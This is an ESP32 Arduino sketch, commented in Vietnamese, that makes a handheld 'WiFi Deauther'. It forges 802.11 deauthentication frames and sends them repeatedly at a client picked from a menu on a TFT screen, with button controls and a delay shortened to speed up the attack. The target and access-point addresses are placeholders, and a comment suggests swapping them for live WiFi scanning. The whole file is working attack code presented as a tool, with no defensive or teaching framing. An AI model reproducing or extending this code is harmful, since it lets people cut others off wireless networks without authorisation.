#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <TFT_eSPI.h>
#include <vector>

// ==================== LCD ====================
TFT_eSPI tft = TFT_eSPI(); 

// ==================== Nút nhấn ====================
#define BTN_SELECT 5   // chọn mục tiêu
#define BTN_ATTACK 23  // bắt đầu/hủy tấn công

// ==================== Cấu trúc Client ====================
struct Client {
    uint8_t mac[6];
    int rssi;
};
std::vector<Client> clients;  
volatile int clientIndex = 0;
bool attacking = false;

// ==================== Packet Deauth ====================
uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,                   // Header
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,       // Destination = broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // Source (sẽ thay bằng AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // BSSID (AP)
    0x00, 0x00,                               // Fragment & Sequence
    0x07, 0x00                                // Reason code
};

// ==================== Gửi gói deauth ====================
void sendDeauth(uint8_t *target, uint8_t *ap) {
    memcpy(&deauthPacket[4], target, 6);  // set Destination
    memcpy(&deauthPacket[10], ap, 6);     // set Source
    memcpy(&deauthPacket[16], ap, 6);     // set BSSID
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

// ==================== Fake danh sách client ====================
// (ở đây tạo sẵn vài client test, mày có thể thay bằng scan WiFi thực)
void loadClients() {
    Client c1 = {{0xAA,0xBB,0xCC,0xDD,0xEE,0x01}, -40};
    Client c2 = {{0xAA,0xBB,0xCC,0xDD,0xEE,0x02}, -55};
    Client c3 = {{0xAA,0xBB,0xCC,0xDD,0xEE,0x03}, -70};
    clients.push_back(c1);
    clients.push_back(c2);
    clients.push_back(c3);
}

// ==================== Hiển thị lên LCD ====================
void showMenu() {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(0,0);
    tft.println("WiFi Deauther");

    for (int i = 0; i < clients.size(); i++) {
        if (i == clientIndex) {
            tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        } else {
            tft.setTextColor(TFT_WHITE, TFT_BLACK);
        }
        tft.printf("%d) %02X:%02X:%02X:%02X:%02X:%02X (RSSI %d)\n",
            i+1,
            clients[i].mac[0], clients[i].mac[1], clients[i].mac[2],
            clients[i].mac[3], clients[i].mac[4], clients[i].mac[5],
            clients[i].rssi
        );
    }

    if (attacking) {
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.println("\n>> Attacking...");
    }
}

// ==================== SETUP ====================
void setup() {
    Serial.begin(115200);

    pinMode(BTN_SELECT, INPUT_PULLUP);
    pinMode(BTN_ATTACK, INPUT_PULLUP);

    // LCD init
    tft.init();
    tft.setRotation(1);
    tft.fillScreen(TFT_BLACK);

    // WiFi init
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);

    loadClients();
    showMenu();
}

// ==================== LOOP ====================
void loop() {
    static unsigned long lastBtn = 0;

    // Nút chọn client
    if (digitalRead(BTN_SELECT) == LOW && millis() - lastBtn > 300) {
        clientIndex++;
        if (clientIndex >= clients.size()) clientIndex = 0;
        showMenu();
        lastBtn = millis();
    }

    // Nút attack
    if (digitalRead(BTN_ATTACK) == LOW && millis() - lastBtn > 300) {
        attacking = !attacking;  // bật/tắt attack
        showMenu();
        lastBtn = millis();
    }

    // Nếu đang attack → spam deauth
    if (attacking && clientIndex < clients.size()) {
        uint8_t apMac[6] = {0xDE,0xAD,0xBE,0xEF,0x00,0x01}; // fake AP
        sendDeauth(clients[clientIndex].mac, apMac);
        delay(50);  // giảm delay để tăng tốc độ tấn công
    } else {
        delay(50);
    }
}